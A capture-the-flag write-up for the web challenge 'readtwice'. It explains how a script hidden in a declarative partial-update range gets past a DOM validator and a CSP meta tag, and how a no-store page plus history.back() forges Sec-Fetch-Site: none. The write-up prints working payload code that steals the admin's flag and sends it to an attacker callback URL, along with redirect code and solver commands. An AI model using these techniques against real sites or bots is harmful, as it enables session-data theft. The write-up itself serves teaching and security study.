# readtwice

**Category:** Web | **Difficulty:** Hard | **Points:** 280 | **Flag:** `pwnsec{5fd599f1a2a5eb0a}`

## Challenge Description

> This is not a revenge its a bookmark
>
> **- @Macabely**

That "bookmark" line is a real hint — it points straight at the `Sec-Fetch-Site: none` trick that makes the whole thing work.

## Initial Analysis

ReadTwice is a browser-bot challenge: we submit a tiny HTML "note", get it reviewed by an admin bot, and try to make that same note read the flag. The interesting routes (`challenge/server.js`):

- `POST /create` — saves a note, but only after `inspectDocument()` approves it.
- `POST /report` — launches the admin bot against our reported URL with a random `rid`.
- `GET /review?rid=...` — opens the note in a sandboxed iframe for approval.
- `GET /sandbox?rid=...` — serves our raw note with a `sandbox allow-scripts` CSP.
- `POST /complete` — marks the review `approved`.
- `GET /reports/check?rid=...` — serves the note again, but only once every state and header check passes.
- `GET /api/flag` — returns the flag, admin session only.

The bot (`challenge/bot.js`) does this before visiting us: create an admin session, hit `/reports/check` once (sets `visited = true`), load `/api/flag`, arm the review (`prepared = true`), then open our URL and wait.

For the second `/reports/check` to actually return the note, the server needs all of:

```
prepared = true,  approved = true,  finalized = true,  used = false
```

and the request must carry exactly:

```
Sec-Fetch-Site: none
Sec-Fetch-Dest: document
```

On top of that, the bot watches every main-frame navigation (`watchDocument`): it permits only the original reported URL and the final `/reports/check` URL. Any other main-frame URL permanently sets `diverged = true` and kills `finalized`. Popups and subframes are *not* watched.

## The Vulnerability

Two independent browser quirks, each obscure on its own, chained together.

### Quirk 1 — the validator checks the *finished* DOM, not the source

`inspectDocument()` opens our HTML in Chromium **with JavaScript disabled** and verifies the final page is exactly:

```html
<!doctype html>
<meta http-equiv="content-security-policy" content="default-src 'none'">
<div></div>
```

Any extra element, attribute, or visible text is rejected. The catch: it inspects the DOM *after parsing*. Chromium's declarative partial-update feature lets a later `<template for=x>` delete an earlier range of nodes marked by `<?start name="x">` / `<?end>` processing instructions. So we put a `<script>` **before** the CSP meta tag, inside that range:

```html
<!doctype html><head><?start name="x"><script>/* our code */</script><?end>
<meta http-equiv="content-security-policy" content="default-src 'none'"></head>
<body><template for=x></template><div></div>
```

- During validation, JS is off, so the script never runs; the `<template for=x>` patch deletes the whole range, and the validator sees only the required meta + div. **Accepted.**
- During the real review, JS is on, so the script executes *before* the patch removes it — and before the `default-src 'none'` meta tag would have blocked it.

The compact script (under the 512-char limit) does double duty:

```js
onmessage = e => e.ports[0].postMessage('ready');
top == self && fetch('/api/flag').then(r => r.text())
  .then(x => location = CALLBACK + '/leak?d=' + encodeURIComponent(btoa(x)));
```

`top == self` is false inside the review iframe (where it just answers `ready`) and true when the note later runs as a top-level document (where it reads the flag).

### Quirk 2 — `Sec-Fetch-Site: none` comes from *how* you navigated

`none` means the browser thinks the navigation came from browser UI (typed URL, bookmark, some history traversals) rather than another page. Ordinary scripted navigation always yields `same-origin` or `cross-site`. The working recipe:

1. The bot opens our `/go` page directly — this first navigation is already `Sec-Fetch-Site: none`.
2. We serve `/go` with `Cache-Control: no-store`.
3. Our page POSTs to its own exact URL (only a `#phase2` fragment added).
4. The POST response calls `history.back()`.
5. Because the original GET was `no-store`, Chromium must re-request it instead of restoring from cache.
6. That history-traversal GET has `Sec-Fetch-Site: none` + `Sec-Fetch-Dest: document`.
7. On this second GET, our server returns a `302` straight to `/reports/check?rid=...`, and the redirect preserves those Fetch-Metadata headers.

Fragments are ignored by HTTP and by the bot's `locationKey()` helper, so the POST and history GET still look like the allowed entry URL to the nav watcher. The only *different* main-frame URL is `/reports/check`, which the watcher explicitly permits.

### The localhost detail

Session cookies are bound to a hostname. The admin bot creates its session on `http://localhost:3000` (its internal `APP_URL`), while our browser client talks to the public HTTPS hostname. So both the `/review` popup and the final `/reports/check` redirect must target the bot's internal `http://localhost:3000`, or the admin cookie is lost. The callback/exfil URLs still use our public tunnel.

## Exploitation

Full solver + callback server: [`solve.py`](solve.py). End to end:

1. Start the callback HTTP server and expose it via an HTTPS tunnel.
2. Create the note carrying the removable pre-CSP script (`make_payload()` builds the `<?start>` / `<template for=x>` structure; ~386 chars remotely, under 512).
3. Report `https://YOUR-TUNNEL/go?note=<NOTE_ID>`.
4. The bot adds its secret `rid` and opens our page.
5. Our `/go` page opens the internal `/review?rid=...` **in a popup** (popups aren't watched, so no `diverged`). The note runs in `/sandbox`, receives the transferred `MessagePort`, and replies `ready` — the trusted parent then POSTs to `/complete`, setting `approved = true`:

   ```js
   open(BOT_APP_URL + '/review?rid=' + encodeURIComponent(rid), 'review');
   setTimeout(() => { /* POST to current URL + '#phase2' */ }, 6000);
   ```

6. After the approval window, the page POSTs to its own URL and the response calls `history.back()`.
7. The second `/go` GET (history traversal, `Sec-Fetch-Site: none`) gets a `302` to the internal `/reports/check?rid=...`:

   ```python
   if rid and state.get_counts[rid] >= 2:
       target = f"{state.bot_app_url}/reports/check?rid={quote(rid)}"
       self.send_response(302); self.send_header("Location", target)
   ```

8. The server sees `prepared/approved/finalized/used` all correct and the right Fetch-Metadata, so it serves our raw note as top-level HTML.
9. This time `top == self`, so the pre-CSP script fetches `/api/flag` with the admin session and navigates to our `/leak` endpoint.
10. The callback base64-decodes the response and prints the flag.

Run it:

```bash
cloudflared tunnel --url http://127.0.0.1:4000 --no-autoupdate   # expose the callback
python3 solve.py https://CHALLENGE_HOST https://YOUR-TUNNEL \
  --bot-app-url http://localhost:3000
```

## Flag

```
pwnsec{5fd599f1a2a5eb0a}
```

Successful run:

```
[+] accepted note: ca2eb5fa21d4a6b80999
[+] history GET -> http://localhost:3000/reports/check?rid=ed47cfb29bcfb10510893553
[+] exfiltrated response: {"flag":"pwnsec{5fd599f1a2a5eb0a}"}
[*] report returned HTTP 200
```

## Key Takeaways

- **A clean post-parse DOM doesn't mean nothing happened during parsing.** Declarative partial updates (`<template for=x>` + PI range markers) let a script run and then vanish before a validator — or a CSP meta tag — ever sees it.
- **Fetch-Metadata headers describe the *navigation*, not just source/destination.** A scripted `no-store` GET + `history.back()` reproduces the `Sec-Fetch-Site: none` profile of a real bookmark/UI navigation — exactly the challenge's hint.
- **Use popups to dodge main-frame navigation watchers**, and remember session cookies are host-scoped (keep the bot on its internal `localhost` origin).
- That's why it's **ReadTwice**: the same note runs once inside the review sandbox to earn approval, then again as the top-level document to steal the flag.
